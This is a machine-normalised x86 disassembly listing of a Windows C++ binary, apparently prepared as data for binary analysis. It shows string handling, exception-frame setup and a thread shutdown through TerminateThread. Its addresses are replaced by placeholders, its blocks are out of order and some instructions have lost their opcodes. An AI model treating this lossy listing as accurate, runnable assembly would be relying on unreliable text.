cmp [ ebp - 0x18 ] ebx
jb r-xdata
mov eax [ eax ]
xor ebx ebx
cmp [ ebp - 0x6c ] 0x10
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0x8c ]
mov edx [ ebp - 0x84 ]
lea eax [ ebp - 0x88 ]
push eax
push ecx
push edx
mov ecx esi
mov [ ebp - 0x88 ] ebx
call sub_412750
mov ebx eax
mov eax [ ebp - 0x88 ]
push eax
push ebx
mov ecx edi
call sub_40d6f0
push 0x1e
push rw-data
mov ecx esi
call sub_412490
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx esi
call sub_412890
mov edi eax
lea edx [ ebp - 0x64 ]
push edx
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_412890
mov ecx [ edi + 0x10 ]
mov edi 0x10
mov [ ebp - 0x4 ] 0x5
cmp [ eax + 0x14 ] edi
jb r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_41a0d6
add esp 0x4
push ecx
mov ecx [ ebp - 0x90 ]
push eax
call sub_40d6f0
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_41a0d6
add esp 0x4
test ebx ebx
je r-xdata
push eax
call sub_41a7eb
add esp 0x4
push ebx
call sub_41a7eb
add esp 0x4
sub_40e0c0
push ebp
mov ebp esp
push 0xffffffff
push sub_42ddea
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0xc ] eax
je r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov [ esi + edx ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov eax [ esi ]
mov edi [ eax + 0x4 ]
add edi esi
mov ecx edi
call sub_40a4f0
lea ebx [ esi + 0x18 ]
push 0x20
mov ecx edi
mov [ edi + 0x38 ] ebx
mov [ edi + 0x3c ] 0x0
call sub_40c030
cmp [ edi + 0x38 ] 0x0
mov [ edi + 0x40 ] al
jne r-xdata
mov [ esi ] r--data
mov [ esi + 0x10 ] r--data
mov [ esi + 0x60 ] r--data
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x1
mov ecx [ esi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ esi + edx + 0x10 ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov [ esi + ecx ] r--data
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x5
mov [ esi + eax ] r--data
call sub_40b000
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ ebx ] r--data
test cl 0x1
jne r-xdata
mov eax [ edi + 0xc ]
or eax 0x4
or eax 0x4
push 0x0
push eax
mov ecx edi
call sub_40a3c0
test cl 0x2
jne r-xdata
mov eax 0x4
test cl 0x8
je r-xdata
or eax 0x2
test cl 0x4
je r-xdata
or eax 0x8
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x3c ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
or eax 0x10
sub_40e1f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42de72
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0xac ] eax
mov eax [ eax ]
push ecx
xor ebx ebx
push eax
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x6c ] 0xf
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x80 ] bl
call sub_4076d0
push 0x18
mov [ ebp - 0x4 ] ebx
call sub_41ac18
add esp 0x4
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_412420
mov esi eax
jmp r-xdata
mov edi [ ebp - 0x1c ]
lea eax [ eax + edi * 2 ]
cmp edx 0x8
jae r-xdata
lea eax [ ebp - 0x2c ]
push 0xb
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] bl
call sub_4124b0
push 0x2c
push rw-data
mov ecx esi
call sub_412490
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_412790
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
mov eax ecx
cmp edx 0x8
jae r-xdata
mov edx [ ebp - 0xa0 ]
push edx
push eax
push ecx
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x88 ] 0xf
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] bl
call sub_40c5c0
push 0x30
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_412490
lea eax [ ebp - 0x64 ]
push eax
mov ecx esi
call sub_412790
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x4
call sub_403a40
cmp [ ebp - 0x50 ] 0x8
mov [ ebp - 0x4 ] 0x3
jb r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x2c ]
mov eax ecx
cmp edx 0x8
jae r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_41a0d6
add esp 0x4
mov edi [ ebp - 0x1c ]
lea eax [ eax + edi * 2 ]
cmp edx 0x8
jae r-xdata
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0xa0 ]
push edx
push eax
push ecx
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x64 ] bl
call sub_40c5c0
mov [ ebp - 0x4 ] 0x5
cmp esi ebx
je r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x9c ]
mov esi 0x10
cmp [ ebp - 0x88 ] esi
jae r-xdata
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
mov eax edx
lea edi [ eax + 0x1 ]
jmp r-xdata
lea edx [ ebp - 0x9c ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
push ebx
push edx
lea ecx [ ebp - 0x80 ]
call sub_40aed0
mov edx [ ebp - 0x64 ]
mov edi eax
cmp [ ebp - 0x50 ] esi
jae r-xdata
mov eax edx
lea esi [ eax + 0x1 ]
lea edx [ ebp - 0x64 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
push ebx
push edx
lea ecx [ ebp - 0x80 ]
call sub_40aed0
cmp edi 0xffffffff
jne r-xdata
xor esi esi
cmp edi 0xffffffff
je r-xdata
cmp eax edi
jne r-xdata
cmp eax 0xffffffff
je r-xdata
mov esi [ ebp - 0x8c ]
mov esi 0x10
jmp r-xdata
mov edi 0xf
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
mov edx [ ebp - 0x70 ]
sub edx esi
push edx
push esi
lea eax [ ebp - 0x80 ]
push eax
push ebx
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x6
call sub_407280
sub esp 0x1c
mov ecx esp
mov [ ebp - 0xa0 ] esp
push 0x4
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ecx ] bl
call sub_4076d0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0xa8 ] esp
push 0x1
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ebp - 0x4 ] 0x7
mov [ ecx ] bl
call sub_4076d0
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x6
call sub_40c740
cmp al bl
jne r-xdata
add esi [ ebp - 0x54 ]
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov ecx [ ebp - 0x38 ]
add ecx esi
push 0x1
push ecx
call sub_41acef
mov edi eax
add esp 0x8
cmp edi ebx
jne r-xdata
sub esp 0x1c
mov ecx esp
mov [ ebp - 0xa8 ] esp
push 0x3
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ecx ] bl
call sub_4076d0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0xa0 ] esp
push 0x1
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ebp - 0x4 ] 0x8
mov [ ecx ] bl
call sub_4076d0
mov ecx [ ebp - 0xa4 ]
lea edx [ ebp - 0x48 ]
push edx
mov [ ebp - 0x4 ] 0x6
call sub_40c740
cmp al bl
jne r-xdata
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
mov edx [ ebp - 0xac ]
mov eax [ edx ]
push eax
call sub_41a7eb
mov eax [ ebp - 0x80 ]
add esp 0x4
cmp [ ebp - 0x6c ] 0x10
jae r-xdata
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
sub esp 0x1c
mov ecx esp
mov [ ebp - 0xa8 ] esp
push 0x3
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ecx ] bl
call sub_4076d0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0xa0 ] esp
push 0x1
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ebp - 0x4 ] 0x9
mov [ ecx ] bl
call sub_4076d0
mov ecx [ ebp - 0xa4 ]
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x4 ] 0x6
call sub_40c740
cmp al bl
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x9c ]
push ecx
call sub_41a0d6
add esp 0x4
push esi
push eax
push edi
call sub_41a0f0
mov eax [ ebp - 0x48 ]
add esp 0xc
cmp [ ebp - 0x34 ] 0x10
jae r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
jmp r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_41a0d6
add esp 0x4
mov esi 0x10
cmp [ ebp - 0x34 ] esi
jb r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
cmp [ ebp - 0x6c ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0x38 ]
push ecx
push eax
lea edx [ edi + esi ]
push edx
call sub_41a0f0
mov ecx [ ebp - 0x38 ]
mov eax [ ebp - 0xac ]
add ecx esi
mov esi 0x10
add esp 0xc
mov [ eax ] edi
mov [ eax + 0x4 ] ecx
cmp [ ebp - 0x34 ] esi
jb r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x48 ] bl
cmp [ ebp - 0x50 ] esi
jb r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x80 ]
push ecx
mov edx [ ebp - 0x48 ]
push edx
call sub_41a0d6
add esp 0x4
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov edx [ ebp - 0x64 ]
push edx
call sub_41a0d6
add esp 0x4
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x9c ]
push eax
call sub_41a0d6
add esp 0x4
xor edx edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] dx
cmp [ ebp - 0x6c ] esi
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x80 ]
push eax
jmp r-xdata
call sub_41a0d6
add esp 0x4
sub_40e6e0
push ebp
mov ebp esp
sub esp 0xc
push edi
mov edi ecx
mov eax [ edi + 0x34 ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
mov eax [ edi + 0x1c ]
push ebx
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x30 ]
push esi
mov esi [ eax ]
xor ebx ebx
cmp esi eax
je r-xdata
pop edi
mov esp ebp
pop ebp
retn
push 0x1
push ebx
call sub_41acef
mov ebx eax
add esp 0x8
mov [ ebp - 0xc ] ebx
test ebx ebx
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop edi
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_40e1f0
mov edx [ esi + 0x8 ]
mov esi [ esi ]
add ebx [ edx + 0x4 ]
cmp esi [ edi + 0x30 ]
jne r-xdata
push 0x10
call sub_41ac18
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] eax
lea ecx [ ecx ]
mov edx [ ebp - 0x8 ]
pop esi
xor eax eax
sub [ edi + 0x1c ] edx
pop ebx
pop edi
mov esp ebp
pop ebp
retn
mov cx [ rw-data ]
mov dl [ rw-data ]
mov [ eax + 0x4 ] cx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x7 ] dl
pop esi
mov [ eax + 0x8 ] ebx
mov edx ecx
mov [ eax + 0x6 ] 0x64
mov [ eax + 0xc ] ecx
mov [ eax ] 0x0
sub [ edi + 0x1c ] edx
pop ebx
pop edi
mov esp ebp
pop ebp
retn
push esi
call sub_41a0d6
mov ecx [ edi + 0x30 ]
mov eax [ ecx ]
add esp 0x4
cmp eax ecx
je r-xdata
push eax
call sub_41a7eb
add esp 0x4
dec [ ebp - 0x4 ]
jne r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
push eax
mov [ ecx + 0x4 ] edx
call sub_41a0d6
add esp 0x4
dec [ edi + 0x34 ]
mov eax [ edi + 0x30 ]
mov ecx [ eax ]
mov esi [ ecx + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax [ esi ]
push edx
push eax
push ebx
call sub_41a0f0
mov eax [ esi ]
add ebx [ esi + 0x4 ]
add esp 0xc
test eax eax
je r-xdata
mov ebx [ ebp - 0xc ]
sub_40e800
push ebp
mov ebp esp
push 0xffffffff
push sub_42df7b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
push 0x18
call sub_41ac18
add esp 0x4
mov [ ebp - 0x1f8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor ebx ebx
mov ecx eax
call sub_412420
mov ebx eax
jmp r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
push 0xb
push rw-data
mov ecx ebx
mov [ ebp - 0x4 ] 0xffffffff
call sub_4124b0
lea ecx [ esi + 0x54 ]
mov [ ebp - 0x1f8 ] ecx
call sub_419e08
lea eax [ ebp - 0x210 ]
lea ecx [ esi + 0x3c ]
push eax
mov [ ebp - 0x204 ] ecx
call sub_4019f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
lea eax [ eax + ecx * 8 ]
xor ecx ecx
mov [ ebp - 0x200 ] ecx
mov [ ebp - 0x1fc ] ecx
push eax
lea ecx [ ebp - 0x200 ]
call sub_4032e0
mov edi [ ebp - 0x200 ]
movzx eax [ edi + 0x6 ]
add eax 0xffffff9b
mov [ ebp - 0x4 ] 0x1
cmp eax 0x8
ja r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov edi [ edx + 0x8 ]
mov eax ecx
shr eax 0x1
and ecx 0x1
cmp edi eax
ja r-xdata
push 0x30
push rw-data
mov ecx ebx
call sub_412490
lea eax [ ebp - 0x64 ]
push eax
mov ecx ebx
call sub_412890
mov edi eax
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] 0x13
call sub_412890
mov ecx [ edi + 0x10 ]
mov edi 0x10
mov [ ebp - 0x4 ] 0x14
cmp [ eax + 0x14 ] edi
jb r-xdata
jmp [ eax * 4 + jump_table_40ef7c ]
push ecx
push eax
mov ecx esi
call sub_40d6f0
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov eax [ eax ]
mov ecx esi
call sub_40a5b0
test al al
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ edi + 0xc ] 0x4
jne r-xdata
lea ecx [ esi + 0x8 ]
call sub_409bc0
push 0x38
push rw-data
mov ecx ebx
mov [ esi + 0x58 ] eax
call sub_412490
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx ebx
call sub_412890
push 0x1
push 0x0
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
call sub_40af80
mov edi eax
push 0x1
push edi
lea ecx [ ebp - 0x2c ]
call sub_406bc0
push 0x1
push 0x3
lea ecx [ ebp - 0x2b8 ]
call sub_40e0c0
mov edx [ esi + 0x58 ]
push edx
lea ecx [ ebp - 0x2a8 ]
mov [ ebp - 0x4 ] 0x3
call sub_40c870
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x2b8 ]
call sub_40d790
push 0xffffffff
push 0x0
push eax
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x4
call sub_407280
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_4031f0
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ edi + 0xc ] 0x4
jne r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0x204 ]
call sub_407a40
mov ecx [ ebp - 0x1f8 ]
call sub_419e11
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x1f0 ] esp
push r--data
call sub_403cc0
mov esi [ esi + 0x18 ]
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x1
mov ecx esi
call eax
jmp r-xdata
mov ecx [ rw-data ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x1f0 ] esp
push r--data
call sub_403cc0
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push 0x0
call eax
mov ecx [ esi + 0x24 ]
push 0x0
push ecx
call [ TerminateThread@IAT ]
mov edx [ esi + 0x24 ]
push edx
call [ CloseHandle@IAT ]
mov [ esi + 0x24 ] 0x0
mov esi [ esi + 0x2c ]
test esi esi
je r-xdata
mov edi [ edi + 0x8 ]
mov eax [ edi ]
mov [ esi + 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
push ecx
push eax
mov ecx esi
call sub_40d6f0
lea ecx [ ebp - 0x2b8 ]
mov [ esi + 0x28 ] 0x1
mov [ ebp - 0x4 ] 0x2
call sub_40bec0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_4031f0
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov ecx esi
mov edi [ edi + 0x8 ]
mov eax [ edi ]
cmp eax [ esi + 0x58 ]
ja r-xdata
mov eax [ edi + 0xc ]
mov [ ebp - 0x1f4 ] eax
cmp eax 0x104
jae r-xdata
mov eax [ edi + 0xc ]
mov [ ebp - 0x1f4 ] eax
cmp eax 0x104
jae r-xdata
push 0x30
push rw-data
mov ecx ebx
call sub_412490
lea edx [ ebp - 0x2c ]
push edx
mov ecx ebx
call sub_412890
push 0x5
push rw-data
mov ecx ebx
mov [ ebp - 0x4 ] 0xd
call sub_412490
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_412890
push 0x6
push rw-data
mov ecx ebx
mov [ ebp - 0x4 ] 0xe
call sub_412490
lea ecx [ ebp - 0x9c ]
push ecx
mov ecx ebx
call sub_412890
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20 ]
mov edi [ ecx ]
mov [ ebp - 0x4 ] 0xf
cmp edi ecx
je r-xdata
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x64 ] 0x0
mov eax [ ebp - 0x64 ]
push eax
call sub_41a0d6
add esp 0x4
mov esi [ ebp - 0x1fc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov ecx ebx
call sub_412460
push ebx
call sub_41a0d6
add esp 0x4
mov ecx esi
call sub_4105e0
push esi
call sub_41a0d6
add esp 0x4
jmp r-xdata
mov ecx esi
test eax eax
je r-xdata
shr eax 0x1
add eax 0x4
push 0x2
push eax
call sub_41acef
mov edx [ ebp - 0x1f4 ]
mov edi [ edi + 0x8 ]
push edx
push edi
push eax
mov [ ebp - 0x1f0 ] eax
call sub_41a0f0
mov eax [ ebp - 0x1f0 ]
mov ecx [ esi + 0x2c ]
add esp 0x14
push eax
call sub_4108f0
push 0x2f
mov ecx ebx
test al al
jne r-xdata
shr eax 0x1
add eax 0x4
push 0x2
push eax
call sub_41acef
mov ecx [ ebp - 0x1f4 ]
mov edi [ edi + 0x8 ]
push ecx
push edi
push eax
mov [ ebp - 0x1f0 ] eax
call sub_41a0f0
mov edx [ ebp - 0x1f0 ]
mov ecx [ esi + 0x2c ]
add esp 0x14
push edx
call sub_410430
mov ecx ebx
test al al
jne r-xdata
push 0x6
push rw-data
mov ecx ebx
call sub_412490
lea ecx [ ebp - 0x10c ]
push ecx
mov ecx ebx
call sub_412890
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x12
call sub_407190
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0xf
call sub_4031f0
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea edx [ edi + 0xc ]
push edx
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x128 ]
push ecx
call sub_40d5f0
lea edx [ ebp - 0x9c ]
push edx
push eax
lea eax [ ebp - 0x1d0 ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_40d6b0
add esp 0x18
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x11
call sub_407190
lea ecx [ ebp - 0x1d0 ]
call sub_4031f0
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0xf
call sub_4031f0
mov edi [ edi ]
mov eax [ esi + 0x2c ]
cmp edi [ eax + 0x20 ]
jne r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
push 0x0
call sub_40de30
dec eax
push eax
call sub_40de30
mov [ esi + 0x28 ] 0x1
jmp r-xdata
push rw-data
call sub_412490
lea eax [ ebp - 0xf0 ]
push eax
mov ecx ebx
call sub_412890
mov edi eax
lea ecx [ ebp - 0xd4 ]
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] 0x7
call sub_412890
cmp [ eax + 0x14 ] 0x10
mov edi [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0x8
jb r-xdata
push rw-data
call sub_412490
lea ecx [ ebp - 0x198 ]
push ecx
mov ecx ebx
call sub_412890
mov edi eax
lea edx [ ebp - 0x160 ]
push edx
mov ecx ebx
mov [ ebp - 0x4 ] 0x5
call sub_412890
cmp [ eax + 0x14 ] 0x10
mov edi [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push 0x2f
push rw-data
call sub_412490
lea edx [ ebp - 0x1ec ]
push edx
mov ecx ebx
call sub_412890
mov edi eax
lea eax [ ebp - 0x1b4 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0xb
call sub_412890
cmp [ eax + 0x14 ] 0x10
mov edi [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0xc
jb r-xdata
push 0x32
push rw-data
call sub_412490
lea eax [ ebp - 0x17c ]
push eax
mov ecx ebx
call sub_412890
mov edi eax
lea ecx [ ebp - 0x144 ]
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] 0x9
call sub_412890
cmp [ eax + 0x14 ] 0x10
mov edi [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0xa
jb r-xdata
mov edx [ ebp - 0x1c ]
push edx
push eax
mov ecx esi
call sub_40d6f0
lea ecx [ ebp - 0x9c ]
call sub_4031f0
lea ecx [ ebp - 0x80 ]
call sub_4031f0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_4031f0
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
push edi
push eax
mov ecx esi
call sub_40d6f0
lea ecx [ ebp - 0xd4 ]
call sub_4031f0
lea ecx [ ebp - 0xf0 ]
mov eax [ eax ]
push edi
push eax
mov ecx esi
call sub_40d6f0
lea ecx [ ebp - 0x160 ]
call sub_4031f0
lea ecx [ ebp - 0x198 ]
jmp r-xdata
mov eax [ eax ]
push edi
push eax
mov ecx esi
call sub_40d6f0
lea ecx [ ebp - 0x1b4 ]
call sub_4031f0
lea ecx [ ebp - 0x1ec ]
mov eax [ eax ]
push edi
push eax
mov ecx esi
call sub_40d6f0
lea ecx [ ebp - 0x144 ]
call sub_4031f0
lea ecx [ ebp - 0x17c ]
jmp r-xdata
mov eax [ eax ]
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov [ ebp - 0x4 ] 0x1
call sub_4031f0
mov edx [ ebp - 0x1f0 ]
push edx
call sub_41a7eb
add esp 0x4
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_4031f0
mov ecx [ ebp - 0x1f0 ]
push ecx
call sub_41a7eb
add esp 0x4
jmp r-xdata
sub_40efa0
push ebp
mov ebp esp
push 0xffffffff
push sub_42dfe1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x18 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_41a0d6
add esp 0x4
lea ecx [ esi + 0x54 ]
call sub_419df1
lea edi [ esi + 0x3c ]
mov [ ebp - 0x14 ] edi
mov ecx edi
mov [ ebp - 0x4 ] 0x4
call sub_407cd0
mov eax [ edi ]
push eax
call sub_41a0d6
mov [ edi ] 0x0
mov ecx [ esi + 0x30 ]
mov eax [ ecx ]
mov [ ecx ] ecx
mov ecx [ esi + 0x30 ]
mov [ ecx + 0x4 ] ecx
add esp 0x4
mov [ esi + 0x34 ] 0x0
cmp eax [ esi + 0x30 ]
je r-xdata
mov eax [ esi + 0x30 ]
push eax
call sub_41a0d6
add esp 0x4
lea ecx [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_409a00
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edi [ eax ]
push eax
call sub_41a0d6
add esp 0x4
mov eax edi
cmp edi [ esi + 0x30 ]
jne r-xdata
sub_40f070
push ebp
mov ebp esp
push 0xffffffff
push sub_42e024
mov eax [ fs : 0x0 ]
